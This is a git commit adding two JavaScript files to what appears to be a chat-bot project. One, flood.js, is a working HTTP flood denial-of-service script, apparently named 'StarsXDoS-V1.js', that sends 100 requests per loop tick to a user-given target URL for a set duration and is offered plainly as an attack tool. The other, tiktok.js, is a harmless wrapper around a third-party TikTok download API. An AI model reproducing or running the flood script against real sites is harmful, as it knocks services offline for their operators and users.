9a37121b8935502807990e01b009bc30dea1abb8
Usmods <usmodscompany@gmail.com>
2025-06-15 08:35:54 +0500

    Add files via upload

---
+++ start/lib/function/flood.js
@@ -0,0 +1,27 @@
+/*
+
+  !- ©rizal-dev
+  https://wa.me/6288213993436
+  
+*/
+
+const target = process.argv[2];
+const duration = process.argv[3];
+
+if (process.argv.length < 4 || isNaN(parseInt(duration))) {
+    console.log('Invalid Usage: node StarsXDoS-V1.js URL DURATION.');
+    process.exit(1)
+} else {
+    const attackInterval = setInterval(() => {
+        for (let i = 0; i < 100; i++) {
+            fetch(target).catch(error => {});
+        }
+        
+    });
+
+    setTimeout(() => {
+        clearInterval(attackInterval);
+        console.log('Attack stopped.');
+        process.exit(0);
+    }, duration * 1000);
+}
---
+++ start/lib/function/tiktok.js
@@ -0,0 +1,21 @@
+/*
+
+  !- ©rizal-dev
+  https://wa.me/6288213993436
+  
+*/
+
+const fetch = require('node-fetch');
+
+async function tiktok(query) {
+  try {
+    const response = await fetch(`https://api.siputzx.my.id/api/tiktok?url=${query}`);
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error(error);
+    throw error;
+  }
+}
+
+module.exports = { tiktok }
